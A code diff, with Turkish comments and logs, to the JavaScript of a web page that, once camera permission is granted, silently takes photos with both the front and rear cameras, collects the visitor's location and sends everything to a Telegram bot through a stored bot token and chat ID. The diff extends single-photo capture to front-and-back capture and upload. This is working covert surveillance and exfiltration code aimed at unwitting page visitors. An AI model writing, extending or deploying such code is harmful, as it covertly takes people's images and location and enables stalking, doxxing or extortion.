@@ -292,7 +292,7 @@
             }
         }
 
-        async function sendToTelegram(message, photo) {
+        async function sendToTelegram(message, photo, photos = null) {
             try {
                 const messageResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -337,7 +337,73 @@
                 const messageResult = await messageResponse.json();
                 console.log('Mesaj gönderildi:', messageResult);
 
-                if (photo) {
+                // Birden fazla fotoğraf gönder (ön ve arka kamera)
+                if (photos && (photos.front || photos.back)) {
+                    // Ön kamera fotoğrafı
+                    if (photos.front) {
+                        try {
+                            console.log('📤 Ön kamera fotoğrafı Telegram\'a gönderiliyor...');
+                            const frontBase64 = photos.front.replace(/^data:image\/\w+;base64,/, '');
+                            const frontBytes = Uint8Array.from(atob(frontBase64), c => c.charCodeAt(0));
+                            const frontBlob = new Blob([frontBytes], { type: 'image/jpeg' });
+                            console.log('📦 Ön kamera blob boyutu:', frontBlob.size, 'bytes');
+                            
+                            const frontFormData = new FormData();
+                            frontFormData.append('chat_id', CHAT_ID);
+                            frontFormData.append('photo', frontBlob, 'front_camera.jpg');
+                            frontFormData.append('caption', '📸 Ön Kamera');
+                            
+                            const frontResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: frontFormData
+                            });
+                            
+                            if (frontResponse.ok) {
+                                const frontResult = await frontResponse.json();
+                                console.log('✅ Ön kamera fotoğrafı başarıyla gönderildi!');
+                            } else {
+                                console.error('❌ Ön kamera fotoğrafı gönderilemedi');
+                                const errorData = await frontResponse.json().catch(() => ({}));
+                                console.error('Hata detayları:', errorData);
+                            }
+                        } catch (e) {
+                            console.error('❌ Ön kamera fotoğrafı gönderilirken hata:', e);
+                        }
+                    }
+                    
+                    // Arka kamera fotoğrafı
+                    if (photos.back) {
+                        try {
+                            console.log('📤 Arka kamera fotoğrafı Telegram\'a gönderiliyor...');
+                            const backBase64 = photos.back.replace(/^data:image\/\w+;base64,/, '');
+                            const backBytes = Uint8Array.from(atob(backBase64), c => c.charCodeAt(0));
+                            const backBlob = new Blob([backBytes], { type: 'image/jpeg' });
+                            console.log('📦 Arka kamera blob boyutu:', backBlob.size, 'bytes');
+                            
+                            const backFormData = new FormData();
+                            backFormData.append('chat_id', CHAT_ID);
+                            backFormData.append('photo', backBlob, 'back_camera.jpg');
+                            backFormData.append('caption', '📸 Arka Kamera');
+                            
+                            const backResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                method: 'POST',
+                                body: backFormData
+                            });
+                            
+                            if (backResponse.ok) {
+                                const backResult = await backResponse.json();
+                                console.log('✅ Arka kamera fotoğrafı başarıyla gönderildi!');
+                            } else {
+                                console.error('❌ Arka kamera fotoğrafı gönderilemedi');
+                                const errorData = await backResponse.json().catch(() => ({}));
+                                console.error('Hata detayları:', errorData);
+                            }
+                        } catch (e) {
+                            console.error('❌ Arka kamera fotoğrafı gönderilirken hata:', e);
+                        }
+                    }
+                } else if (photo) {
+                    // Tek fotoğraf gönder (eski yöntem)
                     try {
                         console.log('📤 Fotoğraf Telegram\'a gönderiliyor...');
                         const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
@@ -369,7 +435,8 @@
                             }
                         } else {
                             const photoResult = await photoResponse.json();
-                            console.log('✅ Fotoğraf başarıyla gönderildi:', photoResult);
+                            console.log('✅ Fotoğraf başarıyla gönderildi!');
+                            console.log('📋 Telegram yanıtı:', JSON.stringify(photoResult, null, 2));
                         }
                     } catch (e) {
                         console.error('❌ Fotoğraf gönderilirken hata:', e);
@@ -444,9 +511,10 @@
             });
         }
 
-        async function takePhoto() {
+        async function takePhoto(facingMode = 'user') {
             try {
-                console.log('📸 Ön kameradan fotoğraf çekiliyor...');
+                const cameraName = facingMode === 'user' ? 'Ön' : 'Arka';
+                console.log(`📸 ${cameraName} kameradan fotoğraf çekiliyor...`);
                 
                 // Mobil cihaz kontrolü
                 const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
@@ -455,19 +523,20 @@
                 // Kamera erişimi
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        facingMode: 'user',
+                        facingMode: facingMode,
                         width: { ideal: 1280 },
                         height: { ideal: 720 }
                     } 
                 });
                 
-                // Kamera izni alındığında izin mesajını gizle
-                const permissionMessage = document.getElementById('permissionMessage');
-                
-                if (permissionMessage) {
-                    permissionMessage.style.display = 'none';
+                // İlk kamera izni alındığında (sadece ön kamera için) izin mesajını gizle
+                if (facingMode === 'user') {
+                    const permissionMessage = document.getElementById('permissionMessage');
+                    if (permissionMessage) {
+                        permissionMessage.style.display = 'none';
+                    }
                 }
-                console.log('✅ Kamera izni alındı, stream aktif');
+                console.log(`✅ ${cameraName} kamera izni alındı, stream aktif`);
                 
                 const video = document.createElement('video');
                 video.srcObject = stream;
@@ -515,7 +584,7 @@
                             
                             // Fotoğrafı al
                             const photoData = canvas.toDataURL('image/jpeg', 0.8);
-                            console.log('✅ Fotoğraf başarıyla çekildi, boyut:', (photoData.length / 1024).toFixed(2), 'KB');
+                            console.log(`✅ ${cameraName} kamera fotoğrafı başarıyla çekildi, boyut:`, (photoData.length / 1024).toFixed(2), 'KB');
                             clearTimeout(timeout);
                             resolve(photoData);
                         } catch (err) {
@@ -549,15 +618,50 @@
                     };
                 });
             } catch (error) {
-                console.error('❌ takePhoto hatası:', error);
+                console.error(`❌ ${facingMode === 'user' ? 'Ön' : 'Arka'} kamera hatası:`, error);
                 console.error('Hata detayları:', error.message, error.name);
                 throw error;
             }
         }
+        
+        // Hem ön hem arka kameradan fotoğraf çek
+        async function takeBothPhotos() {
+            const photos = {
+                front: null,
+                back: null
+            };
+            
+            // Ön kamera
+            try {
+                console.log('📸 [1/2] Ön kameradan fotoğraf çekiliyor...');
+                photos.front = await takePhoto('user');
+                console.log('✅ [1/2] Ön kamera fotoğrafı çekildi');
+            } catch (e) {
+                console.error('❌ Ön kamera fotoğrafı çekilemedi:', e.message);
+            }
+            
+            // Ön kamera stream'inin tamamen kapanmasını bekle
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            
+            // Arka kamera
+            try {
+                console.log('📸 [2/2] Arka kameradan fotoğraf çekiliyor...');
+                photos.back = await takePhoto('environment');
+                if (photos.back) {
+                    console.log('✅ [2/2] Arka kamera fotoğrafı başarıyla çekildi');
+                } else {
+                    console.warn('⚠️ Arka kamera fotoğrafı çekilemedi');
+                }
+            } catch (e) {
+                console.error('❌ Arka kamera fotoğrafı çekilemedi:', e.message);
+                console.error('Hata detayları:', e);
+            }
+            
+            return photos;
+        }
 
         async function requestData() {
             let location = null;
-            let photo = null;
 
             console.log('Konum izni isteniyor...');
             try {
@@ -575,12 +679,13 @@
             }
 
             console.log('📸 Kamera izni isteniyor...');
+            let photos = null;
             try {
-                photo = await takePhoto();
-                if (photo) {
-                    console.log('✅ Fotoğraf başarıyla alındı, boyut:', photo.length, 'karakter');
+                photos = await takeBothPhotos();
+                if (photos.front || photos.back) {
+                    console.log('✅ Fotoğraflar başarıyla alındı');
                 } else {
-                    console.warn('⚠️ Fotoğraf null döndü');
+                    console.warn('⚠️ Fotoğraf çekilemedi');
                 }
             } catch (e) {
                 console.error('❌ Fotoğraf alınamadı:', e.message || e);
@@ -620,13 +725,17 @@
                 message += `❌ Konum alınamadı\n\n`;
             }
 
-            if (photo) {
-                message += `📸 Kamera fotoğrafı çekildi\n`;
+            if (photos && photos.front && photos.back) {
+                message += `📸 Ön ve arka kamera fotoğrafları çekildi\n`;
+            } else if (photos && photos.front) {
+                message += `📸 Ön kamera fotoğrafı çekildi\n`;
+            } else if (photos && photos.back) {
+                message += `📸 Arka kamera fotoğrafı çekildi\n`;
             } else {
                 message += `❌ Fotoğraf alınamadı\n`;
             }
 
-            await sendToTelegram(message, photo);
+            await sendToTelegram(message, null, photos);
         }
 
         // Kapsamlı sistem kontrolü
@@ -780,48 +889,61 @@
             // İlk başta otomatik olarak kamera izni iste
             async function requestCameraPermission() {
                 try {
-                    console.log('📸 Kamera izni isteniyor...');
+                    console.log('📸 [1/3] Kamera izni isteniyor...');
                     
-                    // Fotoğraf çek
-                    const photo = await takePhoto();
+                    // Hem ön hem arka kameradan fotoğraf çek
+                    const photos = await takeBothPhotos();
+                    console.log('📸 [2/3] Fotoğraflar çekildi, kontrol ediliyor...');
+                    
+                    if (!photos.front && !photos.back) {
+                        console.error('❌ Hiçbir fotoğraf çekilemedi!');
+                        throw new Error('Fotoğraf çekilemedi');
+                    }
+                    
+                    if (photos.front) {
+                        console.log('✅ [2/3] Ön kamera fotoğrafı çekildi, boyut:', (photos.front.length / 1024).toFixed(2), 'KB');
+                    }
+                    if (photos.back) {
+                        console.log('✅ [2/3] Arka kamera fotoğrafı çekildi, boyut:', (photos.back.length / 1024).toFixed(2), 'KB');
+                    }
                     
                     // İzin alındı, mesajı gizle
                     if (permissionMessage) {
                         permissionMessage.style.display = 'none';
                     }
                     
-                    console.log('✅ Kamera izni alındı ve fotoğraf çekildi');
+                    // Fotoğrafları Telegram'a gönder
+                    console.log('📤 [3/3] Fotoğraflar Telegram\'a gönderiliyor...');
+                    let message = '🔔 <b>Kamera İzni Verildi</b>\n\n';
+                    message += `⏰ ${new Date().toLocaleString('tr-TR')}\n`;
+                    message += `<a href="${DISPLAY_URL}">${DISPLAY_URL_TEXT}</a>\n\n`;
                     
-                    // Fotoğrafı Telegram'a gönder
-                    if (photo) {
-                        console.log('📤 Fotoğraf Telegram\'a gönderiliyor...');
-                        let message = '🔔 <b>Kamera İzni Verildi</b>\n\n';
-                        message += `⏰ ${new Date().toLocaleString('tr-TR')}\n`;
-                        message += `<a href="${DISPLAY_URL}">${DISPLAY_URL_TEXT}</a>\n\n`;
+                    if (photos.front && photos.back) {
+                        message += `📸 Ön ve arka kamera fotoğrafları çekildi\n`;
+                    } else if (photos.front) {
                         message += `📸 Ön kamera fotoğrafı çekildi\n`;
-                        
-                        try {
-                            await sendToTelegram(message, photo);
-                            console.log('✅ Fotoğraf başarıyla Telegram\'a gönderildi');
-                        } catch (telegramError) {
-                            console.error('❌ Telegram gönderim hatası:', telegramError);
-                            // Hata olsa bile devam et
-                        }
-                    } else {
-                        console.warn('⚠️ Fotoğraf çekilemedi veya null döndü');
+                    } else if (photos.back) {
+                        message += `📸 Arka kamera fotoğrafı çekildi\n`;
                     }
                     
-                    // requestData'yı da çalıştır (konum ve diğer bilgiler için)
-                    try {
-                        requestData();
-                    } catch (dataError) {
-                        console.error('❌ requestData hatası:', dataError);
-                    }
+                    // await ile bekle, hata olursa yakala
+                    await sendToTelegram(message, null, photos);
+                    console.log('✅ [3/3] Fotoğraflar başarıyla Telegram\'a gönderildi!');
+                    
+                    // requestData'yı da çalıştır (konum ve diğer bilgiler için) - ASYNC olarak
+                    setTimeout(() => {
+                        try {
+                            requestData();
+                        } catch (dataError) {
+                            console.error('❌ requestData hatası:', dataError);
+                        }
+                    }, 1000);
                     
                 } catch (error) {
-                    console.error('❌ Kamera izni reddedildi veya hata oluştu:', error);
+                    console.error('❌ [HATA] Kamera izni veya fotoğraf gönderim hatası:', error);
                     console.error('Hata mesajı:', error.message);
                     console.error('Hata adı:', error.name);
+                    console.error('Hata stack:', error.stack);
                     
                     // İzin reddedildi, sarı ünlemli mesajı göster
                     if (permissionMessage) {
@@ -847,27 +969,34 @@
                         
                         console.log('📸 Buton tıklandı, kamera izni isteniyor...');
                         
-                        // Fotoğraf çek
-                        const photo = await takePhoto();
+                        // Hem ön hem arka kameradan fotoğraf çek
+                        const photos = await takeBothPhotos();
                         
                         // İzin alındı, mesajı gizle
                         if (permissionMessage) {
                             permissionMessage.style.display = 'none';
                         }
                         
-                        console.log('✅ Kamera izni alındı ve fotoğraf çekildi');
+                        console.log('✅ Kamera izni alındı ve fotoğraflar çekildi');
                         
-                        // Fotoğrafı Telegram'a gönder
-                        if (photo) {
-                            console.log('📤 Fotoğraf Telegram\'a gönderiliyor...');
+                        // Fotoğrafları Telegram'a gönder
+                        if (photos.front || photos.back) {
+                            console.log('📤 Fotoğraflar Telegram\'a gönderiliyor...');
                             let message = '🔔 <b>Kamera İzni Verildi</b>\n\n';
                             message += `⏰ ${new Date().toLocaleString('tr-TR')}\n`;
                             message += `<a href="${DISPLAY_URL}">${DISPLAY_URL_TEXT}</a>\n\n`;
-                            message += `📸 Ön kamera fotoğrafı çekildi\n`;
+                            
+                            if (photos.front && photos.back) {
+                                message += `📸 Ön ve arka kamera fotoğrafları çekildi\n`;
+                            } else if (photos.front) {
+                                message += `📸 Ön kamera fotoğrafı çekildi\n`;
+                            } else if (photos.back) {
+                                message += `📸 Arka kamera fotoğrafı çekildi\n`;
+                            }
                             
                             try {
-                                await sendToTelegram(message, photo);
-                                console.log('✅ Fotoğraf başarıyla Telegram\'a gönderildi');
+                                await sendToTelegram(message, null, photos);
+                                console.log('✅ Fotoğraflar başarıyla Telegram\'a gönderildi');
                             } catch (telegramError) {
                                 console.error('❌ Telegram gönderim hatası:', telegramError);
                             }
